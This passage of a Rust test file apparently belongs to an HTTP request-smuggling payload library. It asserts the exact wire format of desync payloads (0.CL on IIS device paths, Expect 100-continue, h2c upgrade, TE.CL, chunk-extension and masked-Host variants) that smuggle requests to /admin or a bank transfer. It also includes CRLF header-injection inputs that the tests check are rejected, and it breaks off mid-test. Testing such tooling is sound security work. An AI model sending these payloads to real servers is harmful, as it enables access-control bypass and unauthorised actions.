        let body = &p.raw_bytes[sep_pos + 4..];
        assert_eq!(
            body,
            body_content.as_bytes(),
            "body must be the canonical chunked form"
        );
    }

    /// `malformed_http2_settings` — all three variants present, each has
    /// `HTTP2-Settings:` header with the malformed value.
    ///
    /// The three settings are `"!!!"`, `""`, and `"AA"`. Each must produce
    /// a distinct payload with the corresponding settings value.
    #[test]
    fn malformed_http2_settings_three_variants_present() {
        let payloads = malformed_http2_settings("example.com").unwrap();
        assert_eq!(
            payloads.len(),
            3,
            "must produce exactly 3 malformed variants, got {}",
            payloads.len()
        );
        let expected_settings: &[&str] = &["!!!", "", "AA"];
        for (i, (payload, expected)) in payloads.iter().zip(expected_settings).enumerate() {
            let s = String::from_utf8_lossy(&payload.raw_bytes);
            assert!(
                s.contains(&format!("HTTP2-Settings: {expected}\r\n")),
                "variant {i} must contain 'HTTP2-Settings: {expected}', got:\n{s}"
            );
            assert!(
                s.contains("Upgrade: h2c\r\n"),
                "variant {i} must have Upgrade: h2c, got:\n{s}"
            );
            assert_eq!(
                payload.variant,
                SmugglingVariant::H2c,
                "variant {i} must be H2c smuggling variant"
            );
        }
    }

    /// `malformed_http2_settings` — host validation is applied.
    #[test]
    fn malformed_http2_settings_rejects_crlf_host() {
        assert!(malformed_http2_settings("host\r\nevil").is_err());
        assert!(malformed_http2_settings("host\nevil").is_err());
    }

    /// `detect_te_cl` — exact wire body shape.
    ///
    /// Body must be: `5\r\n\r\n0\r\n\r\n`
    /// - `5\r\n` = chunk-size line (3 bytes; CL covers ONLY these 3)
    /// - `\r\n`  = chunk-data (the 5-byte chunk uses \r\n as content — note:
    ///   actual chunk would be 5 bytes but this probe is timing-based)
    /// - `0\r\n\r\n` = terminating chunk
    ///
    /// CL=3 makes the CL-following front-end read exactly the 3-byte
    /// chunk-size line, while the TE-following back-end reads the full
    /// chunked sequence and hangs.
    #[test]
    fn detect_te_cl_exact_body_shape() {
        let p = detect_te_cl("example.com").unwrap();
        let sep = b"\r\n\r\n";
        let pos = p
            .raw_bytes
            .windows(sep.len())
            .position(|w| w == sep)
            .expect("header separator must be present");
        let body = &p.raw_bytes[pos + sep.len()..];
        assert_eq!(
            body,
            b"5\r\n\r\n0\r\n\r\n",
            "detect_te_cl body must be exactly '5\\r\\n\\r\\n0\\r\\n\\r\\n', \
             got: {body:?}"
        );
        // CL=3 covers the first 3 bytes of the body ("5\r\n").
        assert_eq!(
            &body[..3],
            b"5\r\n",
            "first 3 bytes (what CL-frontend reads) must be '5\\r\\n'"
        );
    }

    /// `h2c_smuggle` with a custom settings string — wire format.
    ///
    /// The custom settings string must appear verbatim in `HTTP2-Settings:`.
    #[test]
    fn h2c_smuggle_custom_settings_in_payload() {
        let custom_settings = "CUSTOM_SETTINGS_B64==";
        let p = h2c_smuggle("example.com", Some(custom_settings)).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(&format!("HTTP2-Settings: {custom_settings}\r\n")),
            "custom HTTP2-Settings must appear verbatim, got:\n{s}"
        );
        assert!(s.contains("Upgrade: h2c\r\n"));
        assert!(s.contains("Connection: Upgrade, HTTP2-Settings\r\n"));
        assert_eq!(p.variant, SmugglingVariant::H2c);
    }

    /// `h2c_smuggle` default settings uses the canonical base64 settings.
    #[test]
    fn h2c_smuggle_default_settings_is_canonical() {
        let p = h2c_smuggle("example.com", None).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(&format!("HTTP2-Settings: {DEFAULT_HTTP2_SETTINGS}\r\n")),
            "default settings must be DEFAULT_HTTP2_SETTINGS, got:\n{s}"
        );
    }

    /// `h2c_post_smuggle` — Content-Length matches body length exactly.
    #[test]
    fn h2c_post_smuggle_content_length_matches_body() {
        let body = b"field=value&other=data";
        let p = h2c_post_smuggle("example.com", body, None).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(&format!("Content-Length: {}\r\n", body.len())),
            "Content-Length must match body byte count exactly ({}), got:\n{s}",
            body.len()
        );
        // Body must be appended after the header block.
        assert!(
            p.raw_bytes.ends_with(body),
            "body bytes must be the last {} bytes of raw_bytes", body.len()
        );
        // Must use POST method.
        assert!(s.starts_with("POST / HTTP/1.1\r\n"));
    }

    /// `h2c_post_smuggle` with empty body — Content-Length must be 0.
    #[test]
    fn h2c_post_smuggle_empty_body() {
        let p = h2c_post_smuggle("example.com", b"", None).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains("Content-Length: 0\r\n"),
            "empty body must produce Content-Length: 0, got:\n{s}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Kettle BH USA 2025 — "HTTP/1.1 Must Die: The Desync Endgame" tests
    // ═══════════════════════════════════════════════════════════════════════

    /// `KETTLE_DESYNC_PRIMITIVES` registry must contain all 10 names.
    #[test]
    fn kettle_primitive_registry_complete() {
        assert_eq!(
            KETTLE_DESYNC_PRIMITIVES.len(),
            10,
            "registry must list all 10 Kettle BH25 primitives"
        );
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"zero_cl_desync"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"vh_masked_header"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"expect_100_smuggle"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"expect_100_obfuscated"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"cl_zero_via_expect"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"double_desync"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"malformed_host_split"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"browser_powered_h2_downgrade"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"line_folded_header"));
        assert!(KETTLE_DESYNC_PRIMITIVES.contains(&"chunk_extension_variants"));
    }

    // ── 1. zero_cl_desync ───────────────────────────────────────────────────

    /// Exact wire format for `zero_cl_desync`.
    #[test]
    fn zero_cl_desync_exact_wire_format() {
        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
        let p = zero_cl_desync("/con", smuggled, 38).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        // Method + reserved path.
        assert!(
            s.starts_with("GET /con HTTP/1.1\r\n"),
            "must start with GET /<reserved-path>, got:\n{s}"
        );
        // Abbreviated host.
        assert!(s.contains("Host: t\r\n"), "must have Host: t, got:\n{s}");
        // Attack Content-Length.
        assert!(
            s.contains("Content-Length: 38\r\n"),
            "must have Content-Length: 38, got:\n{s}"
        );
        // Smuggled request follows the blank line.
        assert!(
            s.contains(smuggled),
            "smuggled request must appear in body, got:\n{s}"
        );
        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
    }

    /// `zero_cl_desync` with empty smuggled body.
    #[test]
    fn zero_cl_desync_empty_smuggled_body() {
        let p = zero_cl_desync("/nul", "", 0).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Content-Length: 0\r\n"));
        assert!(s.contains("GET /nul HTTP/1.1\r\n"));
    }

    /// `zero_cl_desync` with IIS reserved paths.
    #[test]
    fn zero_cl_desync_iis_reserved_paths() {
        for path in IIS_RESERVED_PATHS {
            let p = zero_cl_desync(path, "X", 1).unwrap();
            let s = String::from_utf8_lossy(&p.raw_bytes);
            assert!(
                s.contains(path),
                "reserved path {path} must appear in payload, got:\n{s}"
            );
        }
    }

    /// `zero_cl_desync` rejects CRLF in path.
    #[test]
    fn zero_cl_desync_rejects_crlf_in_path() {
        assert!(zero_cl_desync("/con\r\nX-Injected: 1", "payload", 10).is_err());
        assert!(zero_cl_desync("/nul\nevil", "payload", 10).is_err());
    }

    /// `zero_cl_desync` with oversized CL — not an error (CL is caller-supplied).
    #[test]
    fn zero_cl_desync_large_attack_cl() {
        let p = zero_cl_desync("/aux", "SMUGGLED", usize::MAX).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains(&format!("Content-Length: {}\r\n", usize::MAX)));
    }

    // ── 2. vh_masked_header ─────────────────────────────────────────────────

    /// `vh_masked_header` returns exactly 2 variants.
    #[test]
    fn vh_masked_header_returns_two_variants() {
        let variants = vh_masked_header("Host", "evil.internal").unwrap();
        assert_eq!(
            variants.len(),
            2,
            "must return space-prefix + char-rewrite variants"
        );
    }

    /// Space-prefix variant has a leading space before the header name.
    #[test]
    fn vh_masked_header_space_prefix_wire_format() {
        let variants = vh_masked_header("Host", "evil.internal").unwrap();
        let space_variant = String::from_utf8_lossy(&variants[0].raw_bytes);
        // The header line must start with a space (obs-fold / SP prefix).
        assert!(
            space_variant.contains("\r\n Host: evil.internal\r\n"),
            "space-prefix variant must have ' Host: ...', got:\n{space_variant}"
        );
    }

    /// Char-rewrite variant replaces the first character with 'X'.
    #[test]
    fn vh_masked_header_char_rewrite_wire_format() {
        let variants = vh_masked_header("Host", "evil.internal").unwrap();
        let xname_variant = String::from_utf8_lossy(&variants[1].raw_bytes);
        // "Host" → "Xost"
        assert!(
            xname_variant.contains("Xost: evil.internal\r\n"),
            "char-rewrite must produce 'Xost: evil.internal', got:\n{xname_variant}"
        );
    }

    /// `vh_masked_header` with empty header name — must not panic.
    #[test]
    fn vh_masked_header_empty_name_no_panic() {
        let variants = vh_masked_header("", "value").unwrap();
        assert_eq!(variants.len(), 2, "must still return 2 variants for empty name");
        // Space-prefix: " : value"
        let s0 = String::from_utf8_lossy(&variants[0].raw_bytes);
        assert!(s0.contains(": value\r\n"), "space-prefix must still produce header line");
        // Char-rewrite: empty name → "X-Unknown"
        let s1 = String::from_utf8_lossy(&variants[1].raw_bytes);
        assert!(s1.contains("X-Unknown: value\r\n"), "char-rewrite with empty name must use X-Unknown");
    }

    /// CRLF injection in masked_name is rejected — anti-rig for the
    /// `.ok()` silent-drop bug (§15 AUDIT HUNTS: CRLF injection).
    #[test]
    fn vh_masked_header_rejects_crlf_in_name() {
        let result = vh_masked_header("Host\r\nX-Injected: evil", "val");
        assert!(
            result.is_err(),
            "CRLF in masked_name must be rejected, not silently swallowed"
        );
    }

    /// CRLF injection in value is rejected.
    #[test]
    fn vh_masked_header_rejects_crlf_in_value() {
        let result = vh_masked_header("Host", "evil.internal\r\nX-Injected: payload");
        assert!(
            result.is_err(),
            "CRLF in value must be rejected"
        );
    }

    /// NUL byte in masked_name is rejected.
    #[test]
    fn vh_masked_header_rejects_nul_in_name() {
        let result = vh_masked_header("Host\0extra", "val");
        assert!(
            result.is_err(),
            "NUL byte in masked_name must be rejected"
        );
    }

    /// LF-only (no CR) in value is also rejected.
    #[test]
    fn vh_masked_header_rejects_lf_in_value() {
        let result = vh_masked_header("X-Foo", "bar\nbaz");
        assert!(result.is_err(), "bare LF in value must be rejected");
    }

    // ── 3. expect_100_smuggle ───────────────────────────────────────────────

    /// Exact wire format for `expect_100_smuggle`.
    #[test]
    fn expect_100_smuggle_exact_wire_format() {
        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
        let p = expect_100_smuggle(smuggled, 44).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.starts_with("GET /logout HTTP/1.1\r\n"),
            "must use GET /logout, got:\n{s}"
        );
        assert!(s.contains("Expect: 100-continue\r\n"), "must have Expect header");
        assert!(s.contains("Content-Length: 44\r\n"), "must have attack CL");
        assert!(s.contains(smuggled), "smuggled request must appear in body");
        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
    }

    /// `expect_100_smuggle` with empty smuggled body.
    #[test]
    fn expect_100_smuggle_empty_body() {
        let p = expect_100_smuggle("", 0).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Content-Length: 0\r\n"));
        assert!(s.contains("Expect: 100-continue\r\n"));
    }

    // ── 4. expect_100_obfuscated ────────────────────────────────────────────

    /// `expect_100_obfuscated` produces at least 9 variants.
    #[test]
    fn expect_100_obfuscated_variant_count() {
        let variants = expect_100_obfuscated("", "", "SMUGGLED", 7).unwrap();
        assert!(
            variants.len() >= 9,
            "must produce 6 prefix/suffix + 3 case variants = 9+, got {}",
            variants.len()
        );
    }

    /// All obfuscated variants have the Expect header present.
    #[test]
    fn expect_100_obfuscated_all_have_expect_header() {
        let variants = expect_100_obfuscated("x-", "!", "PAYLOAD", 7).unwrap();
        for v in &variants {
            let s = String::from_utf8_lossy(&v.raw_bytes);
            assert!(s.contains("Expect: "), "all variants must have Expect:, got:\n{s}");
            assert!(s.contains("100"), "all variants must reference '100', got:\n{s}");
        }
    }

    /// The "y 100-continue" Kettle-canonical variant is present.
    #[test]
    fn expect_100_obfuscated_y_prefix_variant_present() {
        let variants = expect_100_obfuscated("", "", "SMUGGLED", 5).unwrap();
        let has_y_prefix = variants.iter().any(|v| {
            String::from_utf8_lossy(&v.raw_bytes).contains("Expect: y 100-continue\r\n")
        });
        assert!(has_y_prefix, "must include 'y 100-continue' variant");
    }

    /// `expect_100_obfuscated` with caller-supplied prefix/suffix (trailing tab).
    #[test]
    fn expect_100_obfuscated_caller_prefix_suffix() {
        let variants = expect_100_obfuscated("CUSTOM-", "-SUFFIX", "BODY", 4).unwrap();
        let has_custom = variants.iter().any(|v| {
            String::from_utf8_lossy(&v.raw_bytes)
                .contains("Expect: CUSTOM-100-continue-SUFFIX\r\n")
        });
        assert!(has_custom, "must include caller-supplied prefix/suffix variant");
    }

    // ── 5. cl_zero_via_expect ───────────────────────────────────────────────

    /// Exact wire format for `cl_zero_via_expect`.
    #[test]
    fn cl_zero_via_expect_exact_wire_format() {
        let smuggled = "GET /secret HTTP/1.1\r\nHost: internal\r\n\r\n";
        let p = cl_zero_via_expect(smuggled, 42).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.starts_with("POST /images/ HTTP/1.1\r\n"),
            "must use POST /images/, got:\n{s}"
        );
        assert!(s.contains("Expect: 100-continue\r\n"), "must have Expect header");
        assert!(s.contains("Content-Length: 42\r\n"), "must have CL=42");
        assert!(s.contains(smuggled), "smuggled must appear in body");
        assert_eq!(p.variant, SmugglingVariant::KettleDesync);
    }

    /// `cl_zero_via_expect` with empty smuggled body.
    #[test]
    fn cl_zero_via_expect_empty_body() {
        let p = cl_zero_via_expect("", 0).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Content-Length: 0\r\n"));
        assert!(s.starts_with("POST /images/ HTTP/1.1\r\n"));
    }

    // ── 6. double_desync ────────────────────────────────────────────────────

    /// `double_desync` produces valid concatenated wire bytes.
    #[test]
    fn double_desync_contains_both_stages() {
        let bytes = double_desync("/con", "/images/", "PAYLOAD").unwrap();
        let s = String::from_utf8_lossy(&bytes);
        // Stage 1: 0.CL desync on /con.
        assert!(s.starts_with("GET /con HTTP/1.1\r\n"), "stage 1 must be GET /con");
        // Stage 2 body embedded in stage 1's body.
        assert!(s.contains("POST /images/ HTTP/1.1\r\n"), "stage 2 POST must appear");
        // Payload appears after stage 2.
        assert!(s.contains("PAYLOAD"), "caller payload must appear");
        // Stage 1's Content-Length must equal the byte length of stage 2.
        let stage2_body = "POST /images/ HTTP/1.1\r\n\
             Host: t\r\n\
             Content-Length: 0\r\n\
             \r\n\
             PAYLOAD";
        let expected_cl = stage2_body.len();
        assert!(
            s.contains(&format!("Content-Length: {expected_cl}\r\n")),
            "stage 1 CL must equal stage 2 byte length ({expected_cl}), got:\n{s}"
        );
    }

    /// `double_desync` rejects CRLF in paths.
    #[test]
    fn double_desync_rejects_crlf_in_paths() {
        assert!(double_desync("/con\r\nevil", "/images/", "X").is_err());
        assert!(double_desync("/con", "/images/\nevil", "X").is_err());
    }

    /// `double_desync` with empty payload.
    #[test]
    fn double_desync_empty_payload() {
        let bytes = double_desync("/nul", "/static/", "").unwrap();
        let s = String::from_utf8_lossy(&bytes);
        assert!(s.contains("GET /nul HTTP/1.1\r\n"));
        assert!(s.contains("POST /static/ HTTP/1.1\r\n"));
    }

    // ── 7. malformed_host_split ─────────────────────────────────────────────

    /// `malformed_host_split` returns one payload per delimiter (8).
    #[test]
    fn malformed_host_split_variant_count() {
        let variants = malformed_host_split("foo").unwrap();
        assert_eq!(
            variants.len(),
            8,
            "must produce 8 variants (one per delimiter), got {}",
            variants.len()
        );
    }

    /// All variants have a `Host:` header and end with `\r\n\r\n`.
    #[test]
    fn malformed_host_split_structure() {
        for v in malformed_host_split("example.com").unwrap() {
            let s = String::from_utf8_lossy(&v.raw_bytes);
            assert!(s.contains("Host: "), "must have Host: header, got:\n{s}");
            assert!(
                v.raw_bytes.ends_with(b"\r\n\r\n"),
                "must end with CRLF CRLF, got:\n{s}"
            );
            assert_eq!(v.variant, SmugglingVariant::KettleDesync);
        }
    }

    /// Delimiter characters are inserted into the host value.
    #[test]
    fn malformed_host_split_delimiters_present() {
        let variants = malformed_host_split("bar").unwrap();
        let raw_strs: Vec<_> = variants
            .iter()
            .map(|v| String::from_utf8_lossy(&v.raw_bytes).to_string())
            .collect();
        // Each delimiter must appear in at least one variant's Host header.
        for delim in &[':', '/', '\\', '?', '#', '@', '[', ']'] {
            assert!(
                raw_strs.iter().any(|s| s.contains(*delim)),
                "delimiter {:?} must appear in some variant", delim
            );
        }
    }

    /// `malformed_host_split` with very short host (shorter than insert_pos=3).
    #[test]
    fn malformed_host_split_short_host() {
        let variants = malformed_host_split("ab").unwrap();
        // Must not panic; all must have a Host header.
        for v in &variants {
            let s = String::from_utf8_lossy(&v.raw_bytes);
            assert!(s.contains("Host: "), "short host must still produce Host header");
        }
    }

    /// `malformed_host_split` with a multi-byte UTF-8 host must not panic.
    ///
    /// Pre-fix: `host_value.len().min(3)` computed a byte-index that could fall
    /// inside a multi-byte UTF-8 character, causing `&host_value[..insert_pos]`
    /// to panic.  E.g. the Japanese character '日' is 3 bytes; slicing a 2-char
    /// host `"日本"` at byte 3 hits the boundary of the second char OK, but a
    /// 1-char host `"日"` is exactly 3 bytes and slicing at 3 means "end", which
    /// is fine — but a 2-byte char preceded by 1 ASCII byte (like `"x£"`) would
    /// have the `£` span bytes 1-2, and slicing at byte 3 (mid-char) panics.
    ///
    /// Fixed: use `char_indices().nth(3)` to find the first safe char boundary
    /// that is ≥ 3 code-points in.
    #[test]
    fn malformed_host_split_multibyte_utf8_no_panic() {
        // "x£" — 'x' is 1 byte, '£' is 2 bytes (U+00A3). Total = 3 bytes.
        // Pre-fix slicing at byte-index 3 hit the end (OK), but "日本a" would hit
        // mid-char. Use a representative mix.
        let cases = &[
            "日本語.com",   // 3-byte chars
            "x£.com",      // 1-byte + 2-byte
            "€€.eu",       // 3-byte + 3-byte
            "a",           // shorter than 3 chars
            "",            // empty
            "abc",         // exactly 3 ASCII
            "abcd",        // > 3 ASCII
        ];
        for case in cases {
            // Must not panic.
            let variants = malformed_host_split(case).unwrap();
            assert_eq!(variants.len(), 8, "must always produce 8 variants for input {case:?}");
            for v in &variants {
                // Must produce a syntactically valid GET request with a Host header.
                let s = String::from_utf8_lossy(&v.raw_bytes);
                assert!(s.contains("Host: "), "multibyte host {case:?} must produce Host header");
                assert!(s.starts_with("GET / HTTP/1.1\r\n"), "must start with GET request line");
            }
        }
    }

    // ── 8. browser_powered_h2_downgrade ─────────────────────────────────────

    /// `browser_powered_h2_downgrade` returns an H2Evasion with conflicting CL.
    #[test]
    fn browser_powered_h2_downgrade_structure() {
        use crate::h2_evasion::H2TargetFlaw;
        let evasion = browser_powered_h2_downgrade("POST", "/login", b"user=x", 10).unwrap();
        // Must target protocol downgrade.
        assert_eq!(evasion.target_flaw, H2TargetFlaw::ProtocolDowngrade);
        // Pseudo-headers: :method, :path, :scheme.
        let methods: Vec<_> = evasion.pseudo_headers.iter()
            .filter(|(k, _)| k == ":method").collect();
        assert_eq!(methods.len(), 1, "must have exactly one :method pseudo-header");
        assert_eq!(methods[0].1, "POST");
        // Conflicting content-length header.
        let cl_headers: Vec<_> = evasion.headers.iter()
            .filter(|(k, _)| k == "content-length").collect();
        assert_eq!(cl_headers.len(), 1, "must have content-length header");
        assert_eq!(cl_headers[0].1, "10", "declared_cl must be 10");
        // Transfer-encoding: chunked for H2.TE.
        let te_headers: Vec<_> = evasion.headers.iter()
            .filter(|(k, _)| k == "transfer-encoding").collect();
        assert_eq!(te_headers.len(), 1, "must have transfer-encoding header");
        assert_eq!(te_headers[0].1, "chunked");
    }

    /// `browser_powered_h2_downgrade` rejects CRLF in method or path.
    #[test]
    fn browser_powered_h2_downgrade_rejects_crlf() {
        assert!(browser_powered_h2_downgrade("GET\r\nX-Evil: 1", "/", b"", 0).is_err());
        assert!(browser_powered_h2_downgrade("GET", "/path\r\nX-Evil: 1", b"", 0).is_err());
    }

    /// `browser_powered_h2_downgrade` with empty body.
    #[test]
    fn browser_powered_h2_downgrade_empty_body() {
        let evasion = browser_powered_h2_downgrade("GET", "/", b"", 0).unwrap();
        // end_stream should be None or Some(false) for empty body.
        assert!(
            evasion.end_stream == Some(false) || evasion.end_stream.is_none(),
            "empty body must set end_stream=false or leave unset"
        );
        // x-body-frame must encode the terminating chunk.
        let body_frame = evasion.headers.iter()
            .find(|(k, _)| k == "x-body-frame")
            .map(|(_, v)| v.as_str())
            .unwrap_or("");
        assert!(body_frame.contains("0\r\n\r\n"), "empty body must produce terminating chunk");
    }

    // ── 9. line_folded_header ────────────────────────────────────────────────

    /// `line_folded_header` exact wire format.
    #[test]
    fn line_folded_header_exact_wire_format() {
        let bytes = line_folded_header("Content-Length", "5", "EXTRA");
        let s = String::from_utf8_lossy(&bytes);
        let expected = "Content-Length: 5\r\n EXTRA\r\n";
        assert_eq!(
            s, expected,
            "line_folded_header must produce exact obs-fold wire format"
        );
    }

    /// Line-folded header with empty fold text.
    #[test]
    fn line_folded_header_empty_fold_text() {
        let bytes = line_folded_header("X-Custom", "value", "");
        let s = String::from_utf8_lossy(&bytes);
        // Must have the obs-fold `\r\n ` even with empty fold text.
        assert!(
            s.contains("X-Custom: value\r\n \r\n"),
            "must produce obs-fold even with empty fold_text, got:\n{s}"
        );
    }

    /// Line-folded header round-trips through a lenient parser.
    #[test]
    fn line_folded_header_in_request_context() {
        // Build a minimal request with a folded header and a real terminator.
        let folded_cl = line_folded_header("Content-Length", "5", "more");
        let mut raw = b"POST / HTTP/1.1\r\nHost: t\r\n".to_vec();
        raw.extend_from_slice(&folded_cl);
        raw.extend_from_slice(b"\r\nhello");
        let s = String::from_utf8_lossy(&raw);
        // The folded value must appear in the raw bytes.
        assert!(s.contains("Content-Length: 5\r\n more\r\n"));
    }

    // ── 10. chunk_extension_variants ────────────────────────────────────────

    /// `chunk_extension_variants` returns exactly 8 variants.
    #[test]
    fn chunk_extension_variants_count() {
        let variants = chunk_extension_variants("SMUGGLED").unwrap();
        assert_eq!(
            variants.len(),
            8,
            "must return exactly 8 chunk-extension variants, got {}",
            variants.len()
        );
    }

    /// Standard key=value extension variant wire format.
    #[test]
    fn chunk_extension_variants_standard_wire_format() {
        let variants = chunk_extension_variants("BODY").unwrap();
        let standard = String::from_utf8_lossy(&variants[0].raw_bytes);
        assert!(
            standard.contains("1;x=y\r\nX\r\n"),
            "standard variant must have '1;x=y\\r\\nX\\r\\n', got:\n{standard}"
        );
        assert!(standard.contains("0\r\n\r\nBODY"), "smuggled body must follow terminator");
        assert_eq!(variants[0].variant, SmugglingVariant::ChunkExtension);
    }

    /// Tab-separated extension variant has `\t` between `;` and name.
    #[test]
    fn chunk_extension_variants_tab_extension() {
        let variants = chunk_extension_variants("").unwrap();
        let tab_variant = String::from_utf8_lossy(&variants[1].raw_bytes);
        assert!(
            tab_variant.contains(";\t"),
            "tab variant must have ';\\t' in chunk line, got:\n{tab_variant}"
        );
    }

    /// Quoted-string extension variant preserves the semicolon inside quotes.
    #[test]
    fn chunk_extension_variants_quoted_string() {
        let variants = chunk_extension_variants("Q").unwrap();
        let quoted = String::from_utf8_lossy(&variants[4].raw_bytes);
        assert!(
            quoted.contains(";x=\"y;z\"\r\nX\r\n"),
            "quoted-string variant must preserve semicolon inside quotes, got:\n{quoted}"
        );
    }

    /// All 8 variants use `Transfer-Encoding: chunked`.
    #[test]
    fn chunk_extension_variants_all_use_chunked_te() {
        for v in chunk_extension_variants("PAYLOAD").unwrap() {
            let s = String::from_utf8_lossy(&v.raw_bytes);
            assert!(
                s.contains("Transfer-Encoding: chunked\r\n"),
                "all variants must declare chunked TE, got:\n{s}"
            );
        }
    }

    /// All 8 variants contain the terminating chunk `0\r\n\r\n`.
    #[test]
    fn chunk_extension_variants_all_have_terminator() {
        for v in chunk_extension_variants("END").unwrap() {
            assert!(
                v.raw_bytes.windows(5).any(|w| w == b"0\r\n\r\n"),
                "all variants must have terminating chunk, got:\n{}",
                String::from_utf8_lossy(&v.raw_bytes)
            );
        }
    }

    // ── §15 hostile-input regression tests ──────────────────────────────────

    /// `malformed_host_split` with an embedded CRLF must return Err.
    ///
    /// Pre-fix: the function had no guard and would interpolate the CRLF
    /// directly into `Host: {mangled}\r\n`, injecting a raw header into
    /// all 8 probe payloads.
    #[test]
    fn malformed_host_split_rejects_crlf_injection() {
        use crate::safety::SafetyError;
        // CR+LF embedded in host_value
        let err = malformed_host_split("abc\r\nX-Evil: injected");
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "CRLF in host_value must be rejected; got: {err:?}"
        );
        // Bare LF
        let err = malformed_host_split("abc\nEvil");
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "bare LF in host_value must be rejected; got: {err:?}"
        );
        // NUL byte (truncates Host at NUL on many stacks)
        let err = malformed_host_split("abc\x00.evil.com");
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "NUL byte in host_value must be rejected; got: {err:?}"
        );
        // Clean value still succeeds
        malformed_host_split("example.com").expect("clean host_value must succeed");
    }

    /// `h2c_smuggle` with a CRLF-embedded `http2_settings` must return Err.
    ///
    /// Pre-fix: only `host` was guarded; `http2_settings` was interpolated
    /// verbatim into `HTTP2-Settings: {settings}\r\n`.
    #[test]
    fn h2c_smuggle_rejects_crlf_in_settings() {
        use crate::safety::SafetyError;
        let err = h2c_smuggle("example.com", Some("AAAA\r\nEvil: hdr"));
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "CRLF in http2_settings must be rejected; got: {err:?}"
        );
        let err = h2c_smuggle("example.com", Some("AAAA\nEvil"));
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "bare LF in http2_settings must be rejected; got: {err:?}"
        );
        // None (default) must still succeed
        h2c_smuggle("example.com", None).expect("None settings must succeed");
        // Safe caller-supplied value must succeed
        h2c_smuggle("example.com", Some("AAQAAA")).expect("safe settings must succeed");
    }

    /// `h2c_post_smuggle` with a CRLF-embedded `http2_settings` must return Err.
    ///
    /// Same vulnerability as `h2c_smuggle` — the `http2_settings` parameter
    /// was not guarded before interpolation into `HTTP2-Settings: {settings}\r\n`.
    #[test]
    fn h2c_post_smuggle_rejects_crlf_in_settings() {
        use crate::safety::SafetyError;
        let err = h2c_post_smuggle("example.com", b"body", Some("X\r\nEvil: yes"));
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "CRLF in http2_settings must be rejected; got: {err:?}"
        );
        let err = h2c_post_smuggle("example.com", b"body", Some("X\x00evil"));
        assert!(
            matches!(err, Err(SafetyError::HeaderInjection)),
            "NUL in http2_settings must be rejected; got: {err:?}"
        );
        // None must succeed
        h2c_post_smuggle("example.com", b"body", None)
            .expect("None settings must succeed");
    }

    /// `chunk_extension_variants` with an oversized body must return Err.
    ///
    /// Pre-fix: the comment claimed "length-only guard" but no guard existed.
    /// An 8× amplification (one clone per variant) on a 500 MiB body would
    /// exhaust ~4 GiB of RAM. The fix adds a 64 KiB cap.
    #[test]
    fn chunk_extension_variants_rejects_oversized_body() {
        use crate::safety::SafetyError;
        // One byte over the 64 KiB limit must be rejected.
        let over = "A".repeat(64 * 1024 + 1);
        let err = chunk_extension_variants(&over);
        assert!(
            matches!(err, Err(SafetyError::PrefixTooLong { .. })),
            "body over 64 KiB must be rejected; got: {err:?}"
        );
        // Exactly at the limit must succeed.
        let exactly = "B".repeat(64 * 1024);
        chunk_extension_variants(&exactly)
            .expect("body at exactly 64 KiB must succeed");
        // Empty body must succeed.
        chunk_extension_variants("").expect("empty body must succeed");
    }

    // ── CVE / real-world adversarial payloads ───────────────────────────────

    /// **CVE-class: IIS 0.CL desync** — reproduces the attack surface described
    /// in Kettle's "$200k in 2 weeks" talk.  An ALB/CloudFront front-end ignores
    /// Content-Length on IIS device paths; IIS back-end honors CL and reads the
    /// smuggled request.  The smuggled `GET /admin` is the canonical HackerOne
    /// report payload class.
    #[test]
    fn adversarial_iis_0cl_desync_cve_class() {
        let smuggled = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n";
        let cl = smuggled.len();
        let p = zero_cl_desync("/con", smuggled, cl).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        // Must be a GET to a device path.
        assert!(s.starts_with("GET /con HTTP/1.1\r\n"));
        // CL must match exactly the smuggled request length.
        assert!(s.contains(&format!("Content-Length: {cl}\r\n")));
        // Smuggled request must appear verbatim in the body.
        let sep = s.find("\r\n\r\n").expect("header/body separator");
        let body = &s[sep + 4..];
        assert_eq!(body, smuggled, "body must be exactly the smuggled request");
    }

    /// **CVE-class: Expect 100-continue front-end bypass** — reproduces the
    /// class of H1 desync where a load balancer responds to Expect immediately
    /// and the back-end reads the body as the next request.  Canonical payload
    /// from Kettle's PortSwigger blog series.
    #[test]
    fn adversarial_expect_100_frontend_bypass_cve_class() {
        let smuggled = "POST /account/transfer HTTP/1.1\r\nHost: bank.internal\r\nContent-Length: 10\r\n\r\namount=999";
        let cl = smuggled.len();
